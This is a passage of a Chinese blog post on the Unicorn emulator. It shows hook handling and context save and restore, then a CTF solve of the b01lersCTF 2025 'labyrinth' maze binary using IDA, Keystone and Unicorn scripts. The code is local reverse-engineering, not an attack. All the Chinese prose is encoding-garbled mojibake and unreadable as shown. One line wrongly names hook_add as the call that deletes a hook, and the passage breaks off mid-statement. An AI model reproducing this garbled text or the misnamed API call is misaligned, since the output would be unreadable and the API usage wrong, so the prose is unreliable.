<h3 id="åˆ é™¤Hook"><a href="#åˆ é™¤Hook" class="headerlink" title="åˆ é™¤Hook"></a>åˆ é™¤Hook</h3><p>ä½¿ç”¨<code>Uc.hook_add(hook_handle)</code>æ¥åˆ é™¤ä¸€ä¸ªhook è¦æ³¨æ„çš„æ˜¯ä¸€ä¸ªhookå¥æŸ„åªèƒ½åœ¨åˆ é™¤æ—¶ä½¿ç”¨ä¸€æ¬¡ è°ƒç”¨å®Œå<code>hook_handle</code>å°±å¤±æ•ˆäº† å³ä½¿ä¸‹æ¬¡å†æ·»åŠ åŒä¸€ä¸ªhookä¹Ÿä¸èƒ½ç”¨è¿™ä¸ª<code>hook_handle</code>æ¥åˆ é™¤</p>
<h2 id="ä¿å­˜-æ¢å¤ä¸Šä¸‹æ–‡"><a href="#ä¿å­˜-æ¢å¤ä¸Šä¸‹æ–‡" class="headerlink" title="ä¿å­˜&#x2F;æ¢å¤ä¸Šä¸‹æ–‡"></a>ä¿å­˜&#x2F;æ¢å¤ä¸Šä¸‹æ–‡</h2><p>ä¸åŒäºä¸“é—¨ç”¨äºæ¨¡æ‹Ÿç¨‹åºæ‰§è¡Œçš„æ‰€æœ‰åˆ†æ”¯çš„angr è‹¥unicornåœ¨æ¨¡æ‹Ÿæ‰§è¡Œå‰ä¸æ‰‹åŠ¨è®¾å®šå„ä¸ªé€šç”¨å¯„å­˜å™¨çš„å€¼å°±ä¼šé»˜è®¤ä¸º0 å½“é‡åˆ°åˆ†æ”¯æ—¶ä¸ä¼šåƒangrä¸€æ ·ç”Ÿæˆå¦ä¸€æ¡stash å› æ­¤å¦‚æœè¦ç”¨unicornå®ç°ç±»ä¼¼çš„åŠŸèƒ½å°±éœ€è¦åœ¨é‡åˆ°åˆ†æ”¯æ—¶æ‰‹åŠ¨ä¿å­˜ä¸Šä¸‹æ–‡ ç„¶åå¯¹äº§ç”Ÿåˆ†æ”¯çš„å¯„å­˜å™¨æˆ–å†…å­˜å†™å…¥å¯èƒ½çš„å€¼å†ä»åˆ†æ”¯ç‚¹å¼€å§‹è¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œ</p>
<p>ç›¸å…³çš„å‡½æ•°ä¸º:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctx = uc.context_save()</span><br><span class="line">uc.context_restore(ctx)</span><br></pre></td></tr></table></figure>

<p>unicornçš„åŸºæœ¬åŠŸèƒ½å°±ç»“æŸäº† ä¸‹é¢æ˜¯å®æˆ˜åº”ç”¨</p>
<h2 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h2><h3 id="b01lersCTF-2025-labyrinth"><a href="#b01lersCTF-2025-labyrinth" class="headerlink" title="[b01lersCTF 2025] labyrinth"></a>[b01lersCTF 2025] labyrinth</h3><h4 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h4><p>ç¨‹åºå®ç°äº†ä¸€ä¸ªç±»ä¼¼è¿·å®«çš„å‡½æ•° è¿™ä¸ªå‡½æ•°æ‰€åœ¨å†…å­˜è¢«mprotectè®¾ç½®ä¸ºäº†rwxæƒé™çš„ é€šè¿‡è¾“å…¥<code>LUDR</code>ä¸­çš„ä¸€ä¸ªæ¥è¿›è¡Œç§»åŠ¨ å‡½æ•°æœ¬ä½“å°±æ˜¯è¿·å®« æ ¹æ®è¾“å…¥ä¼šé—´æ¥è·³è½¬åˆ°å‡½æ•°çš„å…¶ä»–åœ°æ–¹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F04%2F23%2F20250423-134256.png" alt="QQ_1745386973654"></p>
<p>é‚£ä¹ˆè¿·å®«ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„ç‰¹å¾å°±å¾ˆæ˜æ˜¾äº† å› ä¸ºå¦‚æœåˆ°è¾¾ä¸€ä¸ªèŠ‚ç‚¹è‚¯å®šè¦é€šè¿‡callæ¥è·å–è¾“å…¥æ‰èƒ½åˆ°è¾¾ä¸‹ä¸€ä¸ª é‚£ä¹ˆåŸºæœ¬èŠ‚ç‚¹çš„ç‰¹å¾å°±æ˜¯<code>call</code>æŒ‡ä»¤</p>
<p>ç›´æ¥çœ‹è¿™ç§æ§åˆ¶æµæ¥æ‰¾åˆ°é€šå¾€ç»ˆç‚¹çš„è·¯è‚¯å®šæ˜¯å¾ˆéš¾çš„ å› ä¸ºé™¤äº†åŸºæœ¬çš„æ ¹æ®è¾“å…¥æ¥è¿›è¡Œé—´æ¥è·³è½¬ è¿˜æœ‰å‡ ä¸ªèŠ‚ç‚¹ä¼šä¿®æ”¹å‡½æ•°æœ¬èº«å¯¼è‡´æŸäº›èŠ‚ç‚¹å¯¹æŸäº›è¾“å…¥é€ æˆçš„è·³è½¬å‘ç”Ÿæ”¹å˜ è¿™ä¹Ÿæ˜¯è¿™ä¸ªå‡½æ•°çš„å†…å­˜è¢«ä¿®æ”¹æƒé™çš„åŸå› :</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F04%2F23%2F20250423-134652.png" alt="QQ_1745387197955"></p>
<p>å¹¶ä¸”è¿™äº›èŠ‚ç‚¹å¹¶ä¸æ˜¯ç»è¿‡ä¸€æ¬¡æ”¹å˜äº†å‡½æ•°æ§åˆ¶æµåå°±ä¸ç”¨å…³å¿ƒçš„ åç»­è¿˜å¯èƒ½å†ç»è¿‡å¹¶æŠŠå‡½æ•°çš„æ§åˆ¶æµä¿®æ”¹å›å» è¿™æ ·çš„èŠ‚ç‚¹æœ‰5ä¸ª æ‰‹åŠ¨è®°å½•ä¸€ä¸‹ä½ç½®</p>
<p>è¿™ä¸ªæ—¶å€™è¦è·å–æ¸…æ™°çš„å„ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„å…³ç³»å°±æ˜¯å…³é”®äº† ä¸€å¼€å§‹æˆ‘å°è¯•patchç¨‹åºå°†é—´æ¥è·³è½¬ä¿®æ”¹ä¸ºç›´æ¥è·³è½¬ è¿™æ ·IDAå°±èƒ½æˆåŠŸåæ±‡ç¼–æŸ¥çœ‹ä¼ªä»£ç äº†:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># base = 0x400000</span></span><br><span class="line">base = <span class="number">0</span></span><br><span class="line">ea = func = <span class="number">0x13b6</span> + base</span><br><span class="line">end       = <span class="number">0x303A</span> + base</span><br><span class="line"><span class="comment"># end = 0x13EC + base</span></span><br><span class="line">indirect_jmp= [<span class="literal">False</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">nodes       = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_ins</span>():</span><br><span class="line">    <span class="keyword">global</span> ea</span><br><span class="line">    lenth = idaapi.decode_insn(idaapi.insn_t(), ea)</span><br><span class="line">    ea += lenth</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>():</span><br><span class="line">    <span class="keyword">while</span> ea &lt;= end:</span><br><span class="line">        opcode = GetDisasm(ea).split()</span><br><span class="line">        <span class="comment"># print(opcode)</span></span><br><span class="line">        <span class="keyword">if</span> indirect_jmp[<span class="number">0</span>] <span class="keyword">and</span> opcode[<span class="number">0</span>] == <span class="string">&#x27;push&#x27;</span> <span class="keyword">and</span> opcode[<span class="number">1</span>] == <span class="string">&#x27;r15&#x27;</span>:</span><br><span class="line">            new_opcode = ks.asm(<span class="string">f&#x27;mov eax, <span class="subst">&#123;indirect_jmp[<span class="number">2</span>]&#125;</span>&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            new_opcode+= ks.asm(<span class="string">f&#x27;jmp <span class="subst">&#123;func + indirect_jmp[<span class="number">1</span>]&#125;</span>&#x27;</span>, ea - <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">            new_opcode = <span class="built_in">bytes</span>(new_opcode)</span><br><span class="line">            <span class="built_in">print</span>(new_opcode, <span class="string">f&#x27;at <span class="subst">&#123;<span class="built_in">hex</span>(ea - <span class="number">7</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">            idaapi.patch_bytes(ea - <span class="number">7</span>, new_opcode)</span><br><span class="line">            indirect_jmp[<span class="number">0</span>] = <span class="literal">False</span></span><br><span class="line">            ea += <span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(opcode) == <span class="number">3</span> <span class="keyword">and</span> opcode[<span class="number">0</span>] == <span class="string">&#x27;add&#x27;</span> <span class="keyword">and</span> opcode[<span class="number">1</span>] == <span class="string">&#x27;r15,&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Found indirect jmp at: <span class="subst">&#123;<span class="built_in">hex</span>(ea)&#125;</span>&#x27;</span>)</span><br><span class="line">            indirect_jmp[<span class="number">0</span>] = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                indirect_jmp[<span class="number">1</span>] = <span class="built_in">int</span>(opcode[<span class="number">2</span>][:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                indirect_jmp[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">            next_ins()</span><br><span class="line">            opcode = GetDisasm(ea).split()</span><br><span class="line">            indirect_jmp[<span class="number">2</span>] = <span class="built_in">int</span>(opcode[<span class="number">2</span>])</span><br><span class="line">        next_ins()</span><br><span class="line"></span><br><span class="line">patch()</span><br></pre></td></tr></table></figure>

<p>ç¡®å®èƒ½åæ±‡ç¼–äº† ä½†æ˜¯çœ‹èµ·æ¥è¿˜æ˜¯å¾ˆéš¾ç»·:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F04%2F23%2F20250423-135341.png" alt="QQ_1745387478068"></p>
<p>è™½ç„¶å¹¶ä¸å¤æ‚ä½†æ˜¯è·Ÿç»™è‡ªå·±ä¸Šäº†æ··æ·†ä¸€æ · IDAä¹Ÿä¸ä¼šå°†å…¶è¯†åˆ«ä¸ºswitch-caseç»“æ„</p>
<p>è¿™æ—¶å€™å°±è¦è¯·å‡ºæˆ‘ä»¬çš„unicornäº† æ—¢ç„¶æ¯ä¸ªèŠ‚ç‚¹çš„ç‰¹å¾æ˜æ˜¾ å¯ä»¥è½»æ˜“è·å– ä¸”æ¯ä¸ªèŠ‚ç‚¹åªæœ‰4ç§è¾“å…¥ ä¸å¦¨åœ¨æ¯ä¸ªèŠ‚ç‚¹çš„å…¥å£è¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œ4ç§è¾“å…¥çš„ç»“æœ å½“æ¨¡æ‹Ÿæ‰§è¡Œè‡³å…¶ä»–èŠ‚ç‚¹æ—¶è®°å½•è¿™ä¸¤ä¸ªèŠ‚ç‚¹é—´çš„å…³ç³»</p>
<p>æ‰¾åˆ°æ‰€æœ‰åŸºæœ¬èŠ‚ç‚¹çš„å…³ç³»åå†åœ¨ä¿®æ”¹æ§åˆ¶æµçš„èŠ‚ç‚¹å¤„è¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œ ç›´åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æ—¶ä¿å­˜ä¸Šä¸‹æ–‡å†å¯¹æ‰€æœ‰èŠ‚ç‚¹æ‰§è¡Œä¸Šé¢çš„æµç¨‹ æ‰¾å‡ºæ‰€æœ‰ä¸å…ˆå‰ä¸åŒçš„å…³ç³»(å®é™…ä¸Šè¿™ä¸€æ­¥ä¹Ÿå¯ä»¥é™æ€åš ä½†æ˜¯éƒ½unicornäº†å°±è¦ä¸€uåˆ°åº•)</p>
<h4 id="è·å–æ‰€æœ‰èŠ‚ç‚¹"><a href="#è·å–æ‰€æœ‰èŠ‚ç‚¹" class="headerlink" title="è·å–æ‰€æœ‰èŠ‚ç‚¹"></a>è·å–æ‰€æœ‰èŠ‚ç‚¹</h4><p>è¿™ä¸€æ­¥è¿˜æ˜¯é€šè¿‡IDAè¿›è¡Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># base = 0x400000</span></span><br><span class="line">base = <span class="number">0</span></span><br><span class="line">ea = func = <span class="number">0x13b6</span> + base</span><br><span class="line">end       = <span class="number">0x303A</span> + base</span><br><span class="line"><span class="comment"># end = 0x13EC + base</span></span><br><span class="line">indirect_jmp= [<span class="literal">False</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">nodes       = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_ins</span>():</span><br><span class="line">    <span class="keyword">global</span> ea</span><br><span class="line">    lenth = idaapi.decode_insn(idaapi.insn_t(), ea)</span><br><span class="line">    ea += lenth</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_all_node</span>():</span><br><span class="line">    <span class="keyword">while</span> ea &lt;= end:</span><br><span class="line">        opcode = GetDisasm(ea).split()</span><br><span class="line">        <span class="keyword">if</span> opcode[<span class="number">0</span>] == <span class="string">&#x27;call&#x27;</span>:</span><br><span class="line">            nodes.append(ea)</span><br><span class="line">        next_ins()</span><br><span class="line"></span><br><span class="line">get_all_node()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;, &quot;</span>.join(<span class="built_in">hex</span>(node) <span class="keyword">for</span> node <span class="keyword">in</span> nodes))</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nodes = [</span><br><span class="line">    <span class="number">0x13c5</span>, <span class="number">0x1431</span>, <span class="number">0x149d</span>, <span class="number">0x1509</span>, <span class="number">0x1575</span>, <span class="number">0x15e1</span>, <span class="number">0x164d</span>, <span class="number">0x16b9</span>, <span class="number">0x1725</span>, <span class="number">0x1791</span>, <span class="number">0x1934</span>, <span class="number">0x19a0</span>, <span class="number">0x1a0c</span>, <span class="number">0x1a78</span>, <span class="number">0x1ae4</span>, <span class="number">0x1b50</span>, <span class="number">0x1bbc</span>, <span class="number">0x1c25</span>, <span class="number">0x1c91</span>, <span class="number">0x1cfd</span>, <span class="number">0x1d72</span>, <span class="number">0x1dde</span>, <span class="number">0x1e4a</span>, <span class="number">0x1eb6</span>, <span class="number">0x2225</span>, <span class="number">0x2291</span>, <span class="number">0x22fd</span>, <span class="number">0x2369</span>, <span class="number">0x27be</span>, <span class="number">0x282a</span>, <span class="number">0x2896</span>, <span class="number">0x2902</span>, <span class="number">0x296e</span>, <span class="number">0x29da</span>, <span class="number">0x2a46</span>, <span class="number">0x2ab2</span>, <span class="number">0x2b1e</span>, <span class="number">0x2c8c</span>, <span class="number">0x2fcd</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h4 id="è·å–èŠ‚ç‚¹é—´çš„å…³ç³»"><a href="#è·å–èŠ‚ç‚¹é—´çš„å…³ç³»" class="headerlink" title="è·å–èŠ‚ç‚¹é—´çš„å…³ç³»"></a>è·å–èŠ‚ç‚¹é—´çš„å…³ç³»</h4><p>å°±å’Œä¸Šé¢è¯´çš„ä¸€æ · éœ€è¦å…ˆè¿›è¡Œæ¨¡æ‹Ÿå‰çš„ä¸Šä¸‹æ–‡é…ç½®:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">uc = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line">PAGE = <span class="number">0x400</span> ** <span class="number">2</span></span><br><span class="line">CODE = <span class="number">0</span></span><br><span class="line">STACK= PAGE</span><br><span class="line">uc.mem_map(CODE,  PAGE)</span><br><span class="line">uc.mem_map(STACK, PAGE)</span><br><span class="line">uc.mem_write(CODE, <span class="built_in">open</span>(<span class="string">&#x27;.\\labyrinth&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">uc.reg_write(UC_X86_REG_RSP, STACK + PAGE // <span class="number">2</span>)</span><br><span class="line">start   = <span class="number">0x13B6</span></span><br><span class="line">end     = <span class="number">0x303A</span></span><br><span class="line">op      = <span class="number">0x6011</span></span><br><span class="line">fail    = <span class="number">0x3036</span></span><br><span class="line">success = <span class="number">0x1D29</span></span><br><span class="line"></span><br><span class="line">visited     = <span class="built_in">set</span>()</span><br><span class="line">node_attrs  = &#123;&#125;</span><br><span class="line">node_sym    = <span class="string">&#x27;&#x27;</span></span><br><span class="line">node_op     = <span class="string">&#x27;&#x27;</span></span><br><span class="line">switcheron  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">STOP        = <span class="literal">False</span></span><br><span class="line">PRINT       = <span class="literal">False</span></span><br><span class="line">switchers   = [</span><br><span class="line">    <span class="number">0x17FD</span>, <span class="number">0x1F22</span>, <span class="number">0x23D5</span>, <span class="number">0x2B8A</span>, <span class="number">0x2CF8</span></span><br><span class="line">]</span><br><span class="line">nodes       = [</span><br><span class="line"><span class="number">0x13c5</span>, <span class="number">0x1431</span>, <span class="number">0x149d</span>, <span class="number">0x1509</span>, <span class="number">0x1575</span>, <span class="number">0x15e1</span>, <span class="number">0x164d</span>, <span class="number">0x16b9</span>, <span class="number">0x1725</span>, <span class="number">0x1791</span>, <span class="number">0x1934</span>, <span class="number">0x19a0</span>, <span class="number">0x1a0c</span>, <span class="number">0x1a78</span>, <span class="number">0x1ae4</span>, <span class="number">0x1b50</span>, <span class="number">0x1bbc</span>, <span class="number">0x1c25</span>, <span class="number">0x1c91</span>, <span class="number">0x1cfd</span>, <span class="number">0x1d72</span>, <span class="number">0x1dde</span>, <span class="number">0x1e4a</span>, <span class="number">0x1eb6</span>, <span class="number">0x2225</span>, <span class="number">0x2291</span>, <span class="number">0x22fd</span>, <span class="number">0x2369</span>, <span class="number">0x27be</span>, <span class="number">0x282a</span>, <span class="number">0x2896</span>, <span class="number">0x2902</span>, <span class="number">0x296e</span>, <span class="number">0x29da</span>, <span class="number">0x2a46</span>, <span class="number">0x2ab2</span>, <span class="number">0x2b1e</span>, <span class="number">0x2c8c</span>, <span class="number">0x2fcd</span></span><br><span class="line">]</span><br><span class="line">move        = &#123;</span><br><span class="line">    <span class="number">0</span> : <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    <span class="number">1</span> : <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="number">2</span> : <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="number">3</span> : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook0</span>(<span class="params">uc : Uc, address, size, usr_data</span>):</span><br><span class="line">    <span class="keyword">global</span> STOP</span><br><span class="line">    <span class="keyword">if</span> STOP:</span><br><span class="line">        STOP = <span class="literal">False</span></span><br><span class="line">        uc.emu_stop()</span><br><span class="line">    code = uc.mem_read(address, size)</span><br><span class="line">    <span class="keyword">if</span> code[<span class="number">0</span>] == <span class="number">0xE8</span>:</span><br><span class="line">        uc.reg_write(UC_X86_REG_RIP, address + size)</span><br><span class="line">        STOP = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">hook0_handle = uc.hook_add(UC_HOOK_CODE, hook0)</span><br><span class="line">uc.emu_start(CODE + start, end)</span><br></pre></td></tr></table></figure>

<h5 id="emu-stopæ— æ³•ç»ˆæ­¢æ¨¡æ‹Ÿæ‰§è¡Œçš„bug"><a href="#emu-stopæ— æ³•ç»ˆæ­¢æ¨¡æ‹Ÿæ‰§è¡Œçš„bug" class="headerlink" title="emu_stopæ— æ³•ç»ˆæ­¢æ¨¡æ‹Ÿæ‰§è¡Œçš„bug"></a>emu_stopæ— æ³•ç»ˆæ­¢æ¨¡æ‹Ÿæ‰§è¡Œçš„bug</h5><p>ä»£ç ä¸­çš„hookä¸ç›´æ¥è®©æ¨¡æ‹Ÿæ‰§è¡Œåœ¨é‡åˆ°callæ—¶å°±åœæ­¢çš„åŸå› æ˜¯ç›®å‰unicorn 2.0.1.post1æœ‰bug å¦‚æœåœ¨å›è°ƒå‡½æ•°ä¸­ä¿®æ”¹äº†IPå¯„å­˜å™¨é‚£ä¹ˆ<code>emu_stop()</code>ä¼šå¤±æ•ˆ åªèƒ½è®°å½•åœæ­¢ä¿¡å·å¹¶åœ¨ä¸‹ä¸€æ¬¡è¿›å…¥hook å³æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤å‰é€€å‡º</p>
<p>åˆ°è¿™é‡Œä¸ºæ­¢å°±æ˜¯è®©æ¨¡æ‹Ÿæ‰§è¡Œæ¥åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„ä½ç½®çš„ä»£ç  æ­¤æ—¶å°±å¯ä»¥è®°å½•ä¸Šä¸‹æ–‡è¿›è¡Œå¯¹æ¯ä¸ªèŠ‚ç‚¹æ¯ç§æ“ä½œçš„æ¨¡æ‹Ÿäº†:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook1</span>(<span class="params">uc : Uc, address, size, usr_data</span>):</span><br><span class="line">    <span class="keyword">global</span> STOP</span><br><span class="line">    <span class="keyword">if</span> STOP:</span><br><span class="line">        STOP = <span class="literal">False</span></span><br><span class="line">        uc.emu_stop()</span><br><span class="line">    <span class="keyword">global</span> visited, node_sym, node_op</span><br><span class="line">    <span class="keyword">if</span> PRINT:</span><br><span class="line">        code = uc.mem_read(address, size)</span><br><span class="line">        dm   = cs.disasm(code=code, offset=address)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> dm:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">hex</span>(line.address)&#125;</span>\t<span class="subst">&#123;line.mnemonic&#125;</span> <span class="subst">&#123;line.op_str&#125;</span> R14D:<span class="subst">&#123;<span class="built_in">hex</span>(uc.reg_read(UC_X86_REG_R14D))&#125;</span> R15:<span class="subst">&#123;<span class="built_in">hex</span>(uc.reg_read(UC_X86_REG_R15))&#125;</span>&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> nodes:</span><br><span class="line">        visited.add((node_sym, <span class="built_in">hex</span>(address)[<span class="number">2</span>:], node_op))</span><br><span class="line">        uc.reg_write(UC_X86_REG_RIP, address + size)</span><br><span class="line">        STOP = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> address <span class="keyword">in</span> switchers <span class="keyword">and</span> <span class="keyword">not</span> node_sym.startswith(<span class="string">&#x27;S&#x27;</span>):</span><br><span class="line">        visited.add((node_sym, <span class="string">f&quot;S<span class="subst">&#123;switchers.index(address)&#125;</span>&quot;</span>, node_op))</span><br><span class="line">        STOP = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> address == success:</span><br><span class="line">        visited.add((node_sym, <span class="string">&#x27;win&#x27;</span>, node_op))</span><br><span class="line">        STOP = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> address == fail:</span><br><span class="line">        STOP = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">uc.hook_del(hook0_handle)</span><br><span class="line">hook1_handle = uc.hook_add(UC_HOOK_CODE, hook1)</span><br><span class="line">ctx = uc.context_save()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">    node_sym = <span class="built_in">hex</span>(node)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> o <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        node_op = move[o]</span><br><span class="line">        uc.context_restore(ctx)</span><br><span class="line">        uc.reg_write(UC_X86_REG_RIP, CODE + node + <span class="number">0xC</span>)</span><br><span class="line">        uc.reg_write(UC_X86_REG_EAX, o)</span><br><span class="line">        uc.emu_start(CODE + node + <span class="number">0xC</span>, end)</span><br></pre></td></tr></table></figure>

<p>è‡³æ­¤<code>visited</code>ä¸­å°±ä¿å­˜äº†æ‰€æœ‰èŠ‚ç‚¹åœ¨æ²¡æœ‰ç»è¿‡ä»»ä½•ä¸€ä¸ªå¼€å…³æ—¶çš„è¿æ¥çŠ¶æ€ åç»­å°±æ˜¯æ¨¡æ‹Ÿå„ä¸ªå¼€å…³æ‰“å¼€åèŠ‚ç‚¹é—´çš„çŠ¶æ€ hookçš„å®ç°å’Œhook1åŸºæœ¬ç›¸åŒ åªä¸è¿‡è¦æ’é™¤æ‰åŸæœ¬å°±å­˜åœ¨çš„èŠ‚ç‚¹å…³ç³»:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook2</span>(<span class="params">uc : Uc, address, size, usr_data</span>):</span><br><span class="line">    <span class="keyword">global</span> STOP</span><br><span class="line">    <span class="keyword">if</span> STOP:</span><br><span class="line">        STOP = <span class="literal">False</span></span><br><span class="line">        uc.emu_stop()</span><br><span class="line">    <span class="keyword">global</span> visited, node_sym, node_op</span><br><span class="line">    <span class="keyword">if</span> PRINT:</span><br><span class="line">        code = uc.mem_read(address, size)</span><br><span class="line">        dm   = cs.disasm(code=code, offset=address)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> dm:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">hex</span>(line.address)&#125;</span>\t<span class="subst">&#123;line.mnemonic&#125;</span> <span class="subst">&#123;line.op_str&#125;</span> R14D:<span class="subst">&#123;<span class="built_in">hex</span>(uc.reg_read(UC_X86_REG_R14D))&#125;</span> R15:<span class="subst">&#123;<span class="built_in">hex</span>(uc.reg_read(UC_X86_REG_R15))&#125;</span>&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> nodes:</span><br><span class="line">        uc.reg_write(UC_X86_REG_RIP, address + size)</span><br><span class="line">        <span class="keyword">if</span> (node_sym, <span class="built_in">hex</span>(address)[<span class="number">2</span>:], node_op) <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">            visited.add((node_sym, <span class="built_in">hex</span>(address)[<span class="number">2</span>:], <span class="string">f&#x27;<span class="subst">&#123;switcheron&#125;</span>-<span class="subst">&#123;node_op&#125;</span>&#x27;</span>))</span><br><span class="line">        STOP = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> address <span class="keyword">in</span> switchers <span class="keyword">and</span> <span class="keyword">not</span> node_sym.startswith(<span class="string">&#x27;S&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> (node_sym, <span class="string">f&quot;S<span class="subst">&#123;switchers.index(address)&#125;</span>&quot;</span>, <span class="string">f&#x27;<span class="subst">&#123;node_op&#125;</span>&#x27;</span>) <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">            visited.add((node_sym, <span class="string">f&quot;S<span class="subst">&#123;switchers.index(address)&#125;</span>&quot;</span>, <span class="string">f&#x27;<span class="subst">&#123;switcheron&#125;</span>-<span class="subst">&#123;node_op&#125;</span>&#x27;</span>))</span><br><span class="line">        STOP = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> address == success:</span><br><span class="line">        <span class="keyword">if</span> (node_sym, <span class="string">&#x27;win&#x27;</span>, node_op) <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">            visited.add((node_sym, <span class="string">&#x27;win&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;switcheron&#125;</span>-<span class="subst">&#123;node_op&#125;</span>&#x27;</span>))</span><br><span class="line">        STOP = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> address == fail:</span><br><span class="line">        STOP = <span class="literal">True</span></span><br><span class="line">       </span><br><span class="line">hook2_handle = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(switchers)):</span><br><span class="line">    <span class="keyword">if</span> hook2_handle:</span><br><span class="line">        uc.hook_del(hook2_handle)</span><br><span class="line">        hook1_handle = uc.hook_add(UC_HOOK_CODE, hook1)</span><br><span class="line">    node_sym    = <span class="string">f&quot;S<span class="subst">&#123;idx&#125;</span>&quot;</span></span><br><span class="line">    switcheron  = <span class="string">f&#x27;S<span class="subst">&#123;idx&#125;</span>&#x27;</span></span><br><span class="line">    node_op     = <span class="string">&#x27;-&#x27;</span></span><br><span class="line">    uc.context_restore(ctx)</span><br><span class="line">    uc.reg_write(UC_X86_REG_RIP, CODE + switchers[idx])</span><br><span class="line">    uc.mem_write(CODE, 